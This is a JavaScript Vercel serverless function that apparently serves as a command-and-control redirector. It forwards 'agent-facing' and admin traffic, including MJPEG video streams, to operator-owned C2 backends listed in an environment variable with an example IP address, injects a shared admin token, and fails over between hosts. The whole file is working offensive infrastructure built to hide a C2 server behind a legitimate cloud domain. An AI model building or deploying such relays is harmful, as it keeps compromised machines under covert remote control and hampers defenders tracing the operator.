// api/proxy.js
// Forwards /api/proxy/<rest> to <backend>/<rest>, where <backend> is chosen
// from C2_HOSTS. Intended for Vercel deployment where the backend runs on a
// private VPS / operator-owned host.
//
// Env:
//   C2_HOSTS  - comma-separated list, e.g. "http://23.131.24.130:8080"
//   LAB_TOKEN - shared secret injected as x-lab-token on admin requests
//
// Client contract: the Vercel UI always prefixes backend calls with
// "/api/proxy". The first host that answers wins; hosts that error at the
// network layer are skipped for a short TTL.

const HOSTS = (process.env.C2_HOSTS || '')
  .split(',')
  .map((s) => s.trim().replace(/\/$/, ''))
  .filter(Boolean);

// Per-warm-instance memory of hosts that failed recently at the network layer.
const deadHosts = new Map();
const DEAD_TTL_MS = 60_000;

function isDead(base) {
  const t = deadHosts.get(base);
  if (!t) return false;
  if (Date.now() - t > DEAD_TTL_MS) { deadHosts.delete(base); return false; }
  return true;
}
function markDead(base) { deadHosts.set(base, Date.now()); }

function contentTypeIsStreamable(ct) {
  if (!ct) return false;
  const c = ct.toLowerCase();
  return c.startsWith('multipart/x-mixed-replace') || c.startsWith('video/');
}

export default async function handler(req, res) {
  if (!HOSTS.length) { res.status(500).send('C2_HOSTS not configured'); return; }
  if (!process.env.LAB_TOKEN) { res.status(500).send('LAB_TOKEN not configured'); return; }

  // Resolve the path the client asked for under /api/proxy.
  const original =
    req.headers['x-vercel-original-url'] ||
    req.headers['x-forwarded-uri'] ||
    req.headers['x-original-url'] ||
    req.url;

  const qIndex = original.indexOf('?');
  const pathOnly = qIndex >= 0 ? original.slice(0, qIndex) : original;
  const idx = pathOnly.indexOf('/api/proxy');
  let rest = idx >= 0 ? pathOnly.slice(idx + '/api/proxy'.length) : pathOnly;
  if (!rest) rest = '/';
  if (!rest.startsWith('/')) rest = '/' + rest;

  // Small helper endpoint: reports the first live host (used for debugging).
  const lastSeg = rest.split('/').filter(Boolean).pop() || '';
  if (rest === '/__host' || lastSeg === '__host') {
    const live = HOSTS.find(h => !isDead(h)) || HOSTS[0];
    res.setHeader('x-proxy-rest', rest);
    res.status(200).json({ host: live || null });
    return;
  }

  // Buffer the body for non-idempotent methods.
  let body;
  if (req.method !== 'GET' && req.method !== 'HEAD') {
    body = await new Promise((resolve) => {
      const chunks = [];
      req.on('data', (c) => chunks.push(c));
      req.on('end', () => resolve(Buffer.concat(chunks)));
    });
  }

  // Preserve query string (minus Vercel's own ?path=).
  const url = new URL(req.url, 'http://placeholder');
  url.searchParams.delete('path');
  const search = url.search ? url.search : '';

  let lastErr = null;
  let triedAny = false;

  for (const base of HOSTS) {
    if (isDead(base)) continue;
    triedAny = true;

    const target = base + rest + search;
    try {
      const headers = {
        'content-type': req.headers['content-type'] || 'application/json',
        'ngrok-skip-browser-warning': '1',
      };
      // Inject the shared token for the admin surface. /api/* is agent-facing
      // and doesn't need it, and the backend rejects any non-/api/* request
      // without the token.
      if (rest === '/' || rest.startsWith('/admin')) {
        headers['x-lab-token'] = process.env.LAB_TOKEN;
      }

      const r = await fetch(target, {
        method: req.method,
        headers,
        body,
        redirect: 'manual',
      });

      const ct = (r.headers.get('content-type') || '').toLowerCase();

      // Streaming pass-through (MJPEG). Not used by the Vercel UI, but kept
      // for completeness in case someone proxies the stream.
      if (contentTypeIsStreamable(ct)) {
        const { Readable } = require('stream');
        res.status(r.status);
        res.setHeader('content-type', r.headers.get('content-type') || 'application/octet-stream');
        res.setHeader('cache-control', 'no-store');
        res.setHeader('x-proxy-rest', rest);
        res.setHeader('x-proxy-target', target);
        Readable.fromWeb(r.body).pipe(res);
        return;
      }

      const buf = Buffer.from(await r.arrayBuffer());

      res.status(r.status);
      if (ct) res.setHeader('content-type', r.headers.get('content-type'));
      res.setHeader('cache-control', 'no-store');
      res.setHeader('x-proxy-rest', rest);
      res.setHeader('x-proxy-target', target);
      res.send(buf);
      return;
    } catch (e) {
      lastErr = `${base}: ${e.message || e}`;
      markDead(base);
    }
  }

  if (!triedAny) {
    // Everything was marked dead. Clear the cache so the next request retries.
    deadHosts.clear();
    lastErr = 'all hosts were marked dead; cleared cache';
  }

  res.status(502).send(`all C2 hosts failed: ${lastErr}`);
}